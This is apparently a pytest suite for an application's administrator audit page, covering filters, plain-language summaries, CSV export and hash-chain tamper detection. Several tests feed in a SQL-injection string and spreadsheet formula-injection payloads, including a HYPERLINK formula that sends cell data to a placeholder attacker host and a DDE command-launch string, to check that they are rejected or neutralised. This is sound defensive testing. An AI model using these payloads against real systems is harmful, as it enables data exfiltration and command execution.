"""Phase 3: the administrator's audit page, tested through the API.

Filters (action dropdown, denial reason, quick filters), plain-language
details, the event detail panel with its same-session events, the CSV export
with its SHA-256, the "Verify integrity" result and the indexes behind it.
THREATS.md: T34-T39, T70-T74.
"""
from __future__ import annotations

import csv
import hashlib
import io
import json
import re
from datetime import date
from pathlib import Path

import pytest

from conftest import Client, audit_rows
from trustvault import audit_text
from trustvault.audit_text import ACTION_LABELS, reason_text
from trustvault.authz import DENIAL_REASONS, PERMISSION_LEVELS, Action
from trustvault.routes.admin import PRESETS, SHARING_ACTIONS, AuditFilters
from trustvault.security import hash_token, session_ref

DOC_A_NAME = "Salary letter - Carol.pdf"
DOWNLOADS = {"document.download", "document.version_download"}


def search(world, **params) -> dict:
    r = world["admin"].get("/api/admin/audit", params=params)
    assert r.status_code == 200, r.text
    return r.json()


def event(world, seq: int) -> dict:
    r = world["admin"].get(f"/api/admin/audit/events/{seq}")
    assert r.status_code == 200, r.text
    return r.json()


def last_seq(db, **filters) -> int:
    return audit_rows(db, **filters)[-1]["seq"]


# ------------------------------------------------------------ who may look --
@pytest.mark.parametrize("who", ["alice", "carol", "erin"])
def test_only_admins_reach_the_audit_page_and_attempts_are_recorded(world, db, who):
    c = world[who]
    for url in ("/api/admin/audit", "/api/admin/audit/options", "/api/admin/audit/events/1",
                "/api/admin/audit/export", "/api/admin/audit/verify"):
        assert c.get(url).status_code == 403, url
        row = audit_rows(db, action="auth.forbidden")[-1]
        details = json.loads(row["details"])
        assert row["actor_name"] == who and row["outcome"] == "denied"
        assert details == {"reason": "role_required", "role": world[who].user["role"], "required": ["admin"],
                           "method": "GET", "path": url}
    assert world.anon().get("/api/admin/audit/export").status_code == 401


def test_role_refusals_read_plainly(world, db):
    world["carol"].get("/api/admin/users")
    seq = last_seq(db, action="auth.forbidden")
    assert event(world, seq)["event"]["summary"] == (
        "Refused to use an administrator-only function (GET /api/admin/users): their role (viewer) does not allow it")
    world["carol"].get("/api/documents/trash")     # owner-only
    assert "owner-only" in event(world, last_seq(db, action="auth.forbidden"))["event"]["summary"]


# ------------------------------------------------------- dropdown + reasons --
def test_action_dropdown_lists_every_distinct_action_in_the_database(world, db):
    world["bob"].get(f"/api/documents/{world.doc_a}/download")
    opts = world["admin"].get("/api/admin/audit/options").json()
    in_db = {r[0]: r[1] for r in db.execute("SELECT action, COUNT(*) FROM audit_log GROUP BY action")}
    assert {a["action"]: a["count"] for a in opts["actions"]} == in_db
    assert [a["action"] for a in opts["actions"]] == sorted(in_db)
    for a in opts["actions"]:
        assert a["label"] != a["action"] and a["group"] in opts["groups"], a
    assert [p["key"] for p in opts["presets"]] == ["denied", "last_24h", "downloads", "sharing", "expired"]


def test_denial_reason_filter(world, db):
    world["bob"].get(f"/api/documents/{world.doc_a}/download")    # never shared with bob
    world["gina"].get(f"/api/documents/{world.doc_a}/download")   # gina may only view
    reasons = {r["reason"]: r for r in world["admin"].get("/api/admin/audit/options").json()["reasons"]}
    assert reasons["view_only"]["label"] == "their access is View only"
    assert reasons["no_grant"]["count"] >= 1

    r = search(world, reason="view_only")
    assert r["total"] >= 1
    assert all(i["outcome"] == "denied" and i["details"]["reason"] == "view_only" for i in r["items"])
    assert {i["actor_name"] for i in r["items"]} == {"gina"}
    r = search(world, reason="no_grant", actor="bob", action="document.download")
    assert r["total"] == 1 and r["items"][0]["document_id"] == world.doc_a
    # Only denials are searched by reason: an idle sign-out also has reason "idle", but is not a refusal.
    world["carol"].post("/api/auth/logout", json={"reason": "idle"})
    assert search(world, reason="idle")["total"] == 0
    assert world["admin"].get("/api/admin/audit", params={"reason": "x' OR 1=1 --"}).status_code == 422


# ---------------------------------------------------------- quick filters --
def test_quick_filter_denied_only(world, db):
    world["bob"].get(f"/api/documents/{world.doc_a}")
    r = search(world, preset="denied", page_size=500)
    assert r["total"] == len(audit_rows(db, outcome="denied")) >= 1
    assert all(i["outcome"] == "denied" for i in r["items"])


def test_quick_filter_downloads(world):
    world["carol"].get(f"/api/documents/{world.doc_a}/download")                         # allowed
    world["carol"].get(f"/api/documents/{world.doc_a}/versions/{world.version_a1}/download")
    world["gina"].get(f"/api/documents/{world.doc_a}/download")                          # refused
    r = search(world, preset="downloads")
    assert {i["action"] for i in r["items"]} == DOWNLOADS
    assert {i["outcome"] for i in r["items"]} == {"allowed", "denied"}
    both = search(world, preset=["downloads", "denied"])
    assert both["total"] >= 1 and all(i["outcome"] == "denied" and i["action"] in DOWNLOADS for i in both["items"])


def test_quick_filter_sharing_changes(world):
    a = world["alice"]
    a.post(f"/api/documents/{world.doc_a}/grants/{world.grant_gina}/extend", json={"minutes": 60})
    a.post(f"/api/documents/{world.doc_a}/links", json={"username": "carol", "permission": "view"})
    a.delete(f"/api/documents/{world.doc_a}/grants/{world.grant_dave}")
    r = search(world, preset="sharing", page_size=500)
    actions = {i["action"] for i in r["items"]}
    assert {"access.granted", "access.extended", "link.created", "access.revoked"} <= actions
    assert actions <= set(SHARING_ACTIONS)


def test_quick_filter_expired_access(world, db):
    # erin's grant ran out a day ago (the fixture), and she still tries to use it.
    world["erin"].get(f"/api/documents/{world.doc_a}/download")
    r = search(world, preset="expired")
    kinds = {(i["action"], i["details"].get("reason")) for i in r["items"]}
    assert ("access.expired", None) in kinds and ("document.download", "grant_expired") in kinds
    for i in r["items"]:
        assert i["action"] == "access.expired" or i["details"]["reason"] in ("grant_expired", "link_expired")


def test_quick_filter_last_24_hours(world, db, clock):
    clock.advance(hours=25)
    admin = world.fresh("admin")                   # yesterday's sessions have ended
    admin.get(f"/api/admin/documents/{world.doc_a}/access")
    r = admin.get("/api/admin/audit", params={"preset": "last_24h", "page_size": 500}).json()
    assert r["total"] >= 1
    assert "document.upload" not in {i["action"] for i in r["items"]}   # uploaded 25 hours ago
    assert all(i["ts"] >= audit_rows(db, action="auth.login", outcome="allowed")[-1]["ts"][:10] for i in r["items"])
    assert admin.get("/api/admin/audit", params={"preset": "everything"}).status_code == 422


# -------------------------------------------------------- plain language --
def test_details_are_in_plain_language_with_the_raw_json_kept(world, db):
    c = world.anon()
    c.login("carol")
    c.login("carol", mode="bearer")
    logins = search(world, action="auth.login", outcome="allowed", actor="carol")["items"]
    assert logins[1]["summary"] == "Signed in (browser session)" and logins[1]["details"]["mode"] == "cookie"
    assert logins[0]["summary"] == "Signed in (API token)" and logins[0]["details"]["mode"] == "bearer"
    assert logins[0]["details"]["second_factor"] == "none"

    world["gina"].get(f"/api/documents/{world.doc_a}/download")
    refused = search(world, action="document.download", actor="gina")["items"][0]
    assert refused["summary"] == f"Refused to download “{DOC_A_NAME}”: their access is View only"
    assert refused["details"]["reason"] == "view_only" and refused["action_label"] == "Download"

    granted = search(world, action="access.granted", document_id=world.doc_a)["items"]
    carol = next(i for i in granted if i["details"]["target_username"] == "carol")
    assert carol["summary"] == f"Gave carol View + download access to “{DOC_A_NAME}” for 30 minutes"
    failed = Client(world.app).login("carol", "wrong-password-123")
    assert failed.status_code == 401
    assert search(world, action="auth.login", outcome="denied")["items"][0]["summary"] == "Sign-in refused: wrong password"


def test_every_action_and_reason_has_plain_words():
    root = Path(__file__).resolve().parent.parent / "trustvault"
    written = set()
    for path in root.rglob("*.py"):
        if path.name in ("audit_text.py", "preview.py", "crypto.py"):  # these build file names ("document.pdf", "audit.key")
            continue
        written |= set(re.findall(r'"((?:auth|document|access|link|user|audit|ai)\.[a-z0-9_.]+)"',
                                  path.read_text(encoding="utf-8")))
    written |= {f"document.{a.value}" for a in (Action.DELETE, Action.RESTORE, Action.PURGE)}  # require_access default
    assert written - set(ACTION_LABELS) == set(), "actions without a plain-language label"
    for code in DENIAL_REASONS:
        assert reason_text(code), code
    for level in PERMISSION_LEVELS:
        for action in Action:
            assert reason_text(f"{level}_cannot_{action.value}"), (level, action)


def test_no_event_in_a_busy_trail_falls_back_to_codes(world, db):
    """Run a little of everything, then check every sentence on the page."""
    a, c = world["alice"], world["carol"]
    c.get(f"/api/documents/{world.doc_a}")
    c.get(f"/api/documents/{world.doc_a}/download")
    world["gina"].get(f"/api/documents/{world.doc_a}/download")
    world["bob"].get(f"/api/documents/{world.doc_a}/activity")
    a.post(f"/api/documents/{world.doc_a}/links", json={"username": "gina", "permission": "view"})
    a.patch(f"/api/documents/{world.doc_a}", json={"description": "Q3"})
    world["admin"].get("/api/admin/audit/verify")
    world["admin"].get("/api/admin/audit/export")
    items = search(world, page_size=500)["items"]
    for i in items:
        assert i["summary"] and i["summary"] != i["action"], i
        assert "_" not in i["summary"].replace(world.doc_a, ""), i["summary"]   # no raw reason codes left


# ---------------------------------------------------- event detail panel --
def test_detail_panel_shows_the_full_event_user_agent_and_hash(world, db):
    c = Client(world.app)
    c.http.headers["User-Agent"] = "Mozilla/5.0 (TrustVault test browser)"
    c.login("carol")
    c.get(f"/api/documents/{world.doc_a}/download")
    seq = last_seq(db, action="document.download", outcome="allowed")
    d = event(world, seq)
    e = d["event"]
    assert e["seq"] == seq and e["actor_name"] == "carol" and e["document_name"] == DOC_A_NAME
    assert e["user_agent"] == "Mozilla/5.0 (TrustVault test browser)"
    assert re.fullmatch(r"[0-9a-f]{64}", e["entry_hash"]) and re.fullmatch(r"[0-9a-f]{64}", e["prev_hash"])
    assert e["prev_hash"] == audit_rows(db, seq=seq - 1)[0]["entry_hash"]
    assert e["details"]["sha256"] and e["summary"].startswith(f"Downloaded “{DOC_A_NAME}”")
    assert d["integrity"] == {"hash_matches": True, "links_to_previous": True}


def test_detail_panel_lists_other_events_from_the_same_session(world, db):
    first, second = world.fresh("carol"), world.fresh("carol")
    first.get(f"/api/documents/{world.doc_a}")
    first.get(f"/api/documents/{world.doc_a}/download")
    second.get(f"/api/documents/{world.doc_a}/download")
    first_dl, second_dl = [r["seq"] for r in audit_rows(db, action="document.download", outcome="allowed")[-2:]]

    s = event(world, first_dl)["session"]
    actions = [e["action"] for e in s["events"]]
    assert actions[:1] == ["auth.login"] and "document.view" in actions and "document.download" in actions
    assert second_dl not in {e["seq"] for e in s["events"]}
    assert {e["session_ref"] for e in s["events"]} == {s["ref"]} and s["total"] == len(s["events"])
    assert event(world, second_dl)["session"]["ref"] != s["ref"]

    # The tag is derived from the session, but is not the token or its stored hash.
    token = first.http.cookies.get("tv_session")
    assert s["ref"] == session_ref(hash_token(token))
    for secret in (token, hash_token(token)):
        assert s["ref"] not in secret
        assert db.execute("SELECT COUNT(*) FROM audit_log WHERE instr(details, ?) OR session_ref = ?",
                          (secret, secret)).fetchone()[0] == 0
    # "Show all in the table" is the same list through the search filter.
    assert {i["seq"] for i in search(world, session=s["ref"], page_size=500)["items"]} == {e["seq"] for e in s["events"]}
    # Signing out (or timing out) belongs to the same session.
    first.post("/api/auth/logout")
    assert audit_rows(db, action="auth.logout")[-1]["session_ref"] == s["ref"]


def test_events_outside_a_session_say_so(world, db):
    Client(world.app).login("carol", "wrong-password-123")
    d = event(world, last_seq(db, action="auth.login", outcome="denied"))
    assert d["session"] is None and d["event"]["session_ref"] is None


def test_detail_panel_flags_a_tampered_event(world, db):
    world["carol"].get(f"/api/documents/{world.doc_a}/download")
    seq = last_seq(db, action="document.download", outcome="allowed")
    db.execute("DROP TRIGGER audit_log_no_update")
    db.execute("DROP TRIGGER audit_log_no_delete")
    db.execute("UPDATE audit_log SET actor_name = 'bob' WHERE seq = ?", (seq,))
    assert event(world, seq)["integrity"] == {"hash_matches": False, "links_to_previous": True}
    db.execute("DELETE FROM audit_log WHERE seq = ?", (seq - 1,))
    assert event(world, seq)["integrity"]["links_to_previous"] is False


def test_detail_of_a_missing_event(world):
    assert world["admin"].get("/api/admin/audit/events/999999").status_code == 404
    assert world["admin"].get("/api/admin/audit/events/0").status_code == 422
    assert world["admin"].get("/api/admin/audit/events/abc").status_code == 422


# ------------------------------------------------------------ CSV export --
def parse_csv(content: bytes) -> list[dict]:
    assert content.startswith(b"\xef\xbb\xbf")
    return list(csv.DictReader(io.StringIO(content.decode("utf-8-sig"), newline="")))


def test_export_is_the_filtered_view_and_its_sha256_is_logged(world, db):
    world["bob"].get(f"/api/documents/{world.doc_a}/download")
    expected = search(world, outcome="denied")["total"]
    r = world["admin"].get("/api/admin/audit/export", params={"outcome": "denied"})
    assert r.status_code == 200
    assert r.headers["content-type"].startswith("text/csv")
    assert re.fullmatch(r'attachment; filename="trustvault-audit-\d{8}-\d{6}\.csv"', r.headers["content-disposition"])
    digest = hashlib.sha256(r.content).hexdigest()
    assert r.headers["x-content-sha256"] == digest
    rows = parse_csv(r.content)
    assert len(rows) == expected == int(r.headers["x-export-rows"])
    assert {row["outcome"] for row in rows} == {"denied"}
    assert list(rows[0]) == ["seq", "time_utc", "actor", "actor_id", "action", "action_label", "outcome", "summary",
                             "document_id", "document_name", "target_user", "ip", "user_agent", "session_ref",
                             "details_json", "prev_hash", "entry_hash"]
    bob = next(row for row in rows if row["actor"] == "bob")
    assert bob["summary"].startswith("Refused to download") and json.loads(bob["details_json"])["reason"] == "no_grant"

    logged = audit_rows(db, action="audit.export")[-1]
    details = json.loads(logged["details"])
    assert logged["actor_name"] == "admin" and logged["outcome"] == "allowed"
    assert details["sha256"] == digest and details["rows"] == expected and details["bytes"] == len(r.content)
    assert details["filters"] == {"outcome": "denied"}


def test_export_follows_quick_filters_and_reasons(world):
    world["gina"].get(f"/api/documents/{world.doc_a}/download")
    world["carol"].get(f"/api/documents/{world.doc_a}/download")
    rows = parse_csv(world["admin"].get("/api/admin/audit/export", params={"preset": "downloads"}).content)
    assert rows and {row["action"] for row in rows} <= DOWNLOADS
    rows = parse_csv(world["admin"].get("/api/admin/audit/export", params={"reason": "view_only"}).content)
    assert {row["actor"] for row in rows} == {"gina"}


def test_exported_cells_cannot_run_as_spreadsheet_formulas(world, db):
    """Usernames of failed sign-ins and user agents are typed by the attacker."""
    evil = Client(world.app)
    evil.http.headers["User-Agent"] = "+SUM(1+1)*cmd|' /C calc'!A0"
    evil.login('=HYPERLINK("http://evil.example/?"&A1,"Click for details")', "x-password-123")
    world.anon().login("@SUM(1,1)", "x-password-123")
    world.anon().login("-2+3", "x-password-123")
    r = world["admin"].get("/api/admin/audit/export", params={"action": "auth.login", "outcome": "denied"})
    rows = parse_csv(r.content)
    actors = {row["actor"] for row in rows}
    assert "'=HYPERLINK(\"http://evil.example/?\"&A1,\"Click for details\")" in actors
    assert {"'@SUM(1,1)", "'-2+3"} <= actors
    assert any(row["user_agent"].startswith("'+SUM") for row in rows)
    for row in rows:
        for value in row.values():
            assert not value.startswith(("=", "+", "-", "@", "\t", "\r")), value
    # The audit trail itself keeps the exact text (it is only neutralised on the way out).
    assert audit_rows(db, action="auth.login", outcome="denied")[-3]["actor_name"].startswith("=HYPERLINK")


def test_exported_chain_columns_link_up(world):
    world["carol"].get(f"/api/documents/{world.doc_a}/download")
    rows = parse_csv(world["admin"].get("/api/admin/audit/export").content)
    assert rows[0]["seq"] == "1" and rows[0]["prev_hash"] == "0" * 64
    for before, after in zip(rows, rows[1:]):
        assert int(after["seq"]) == int(before["seq"]) + 1
        assert after["prev_hash"] == before["entry_hash"]


def test_an_export_that_is_too_big_is_refused_and_logged(world, db):
    ctx = world.app.state.ctx
    ctx.settings = ctx.settings.with_overrides(audit_export_max_rows=5)
    r = world["admin"].get("/api/admin/audit/export")
    assert r.status_code == 400 and "at most 5" in r.json()["detail"]
    row = audit_rows(db, action="audit.export")[-1]
    assert row["outcome"] == "denied" and json.loads(row["details"])["reason"] == "too_many_rows"
    assert world["admin"].get("/api/admin/audit/export", params={"action": "audit.export"}).status_code == 200


# ------------------------------------------------------- verify integrity --
def test_verify_reports_chain_intact_with_the_number_of_events(world, db):
    count = db.execute("SELECT COUNT(*) FROM audit_log").fetchone()[0]
    r = world["admin"].get("/api/admin/audit/verify").json()
    assert r["ok"] is True and r["entries_checked"] == count
    assert r["message"] == f"Chain intact ({count} events)"
    logged = json.loads(audit_rows(db, action="audit.verify")[-1]["details"])
    assert logged["message"] == r["message"] and logged["ok"] is True
    assert search(world, action="audit.verify")["items"][0]["summary"] == \
        f"Verified the audit trail: chain intact ({count} events)"


def test_verify_names_the_first_broken_event(world, db):
    db.execute("DROP TRIGGER audit_log_no_update")
    db.execute("UPDATE audit_log SET details = '{}' WHERE seq = 5")
    r = world["admin"].get("/api/admin/audit/verify").json()
    assert r["ok"] is False and r["first_bad_seq"] == 5
    assert r["message"] == "Chain broken at event #5: event #5 has been modified"
    assert json.loads(audit_rows(db, action="audit.verify")[-1]["details"])["first_bad_seq"] == 5


def test_verify_names_the_first_missing_event(world, db):
    db.execute("DROP TRIGGER audit_log_no_delete")
    db.execute("DELETE FROM audit_log WHERE seq = 7")
    r = world["admin"].get("/api/admin/audit/verify").json()
    assert r["first_bad_seq"] == 7 and "event #7 is missing" in r["message"]


def test_verify_names_the_first_missing_event_after_a_truncation(world, db):
    last = db.execute("SELECT MAX(seq) FROM audit_log").fetchone()[0]
    db.execute("DROP TRIGGER audit_log_no_delete")
    db.execute("DELETE FROM audit_log WHERE seq > ?", (last - 2,))
    r = world["admin"].get("/api/admin/audit/verify").json()
    assert r["first_bad_seq"] == last - 1 and f"event #{last - 1} is missing" in r["message"]
    assert "truncated" in r["message"]


# --------------------------------------------------------------- indexes --
def test_the_audit_indexes_exist_and_the_filters_use_them(world, db):
    def cols(index):
        return [r["name"] for r in db.execute(f"PRAGMA index_info({index})")]
    assert cols("idx_audit_ts") == ["ts"]
    assert cols("idx_audit_actor_ts") == ["actor_name", "ts"]
    assert cols("idx_audit_action_outcome_ts") == ["action", "outcome", "ts"]
    assert cols("idx_audit_doc") == ["document_id"]

    def plan(**filters):
        where, params = AuditFilters(**filters).sql()
        return " ".join(r["detail"] for r in db.execute(
            f"EXPLAIN QUERY PLAN SELECT COUNT(*) FROM audit_log a WHERE {where}", params))
    assert "idx_audit_actor_ts" in plan(actor="Carol")          # case-insensitive, still indexed
    assert "idx_audit_action_outcome_ts" in plan(action="document.download", outcome="denied")
    assert "idx_audit_doc" in plan(document_id=world.doc_a)
    assert "idx_audit_ts" in plan(date_from=date.today())
    assert "idx_audit_session" in plan(session="0123456789abcdef")


def test_presets_are_fixed_sql(world):
    """Quick filters are fixed fragments: nothing a caller sends ends up in SQL text."""
    for key, (_, _, fragment) in PRESETS.items():
        assert ":" not in fragment.replace(":since_24h", "") and "{" not in fragment, key
    assert audit_text.GROUPS
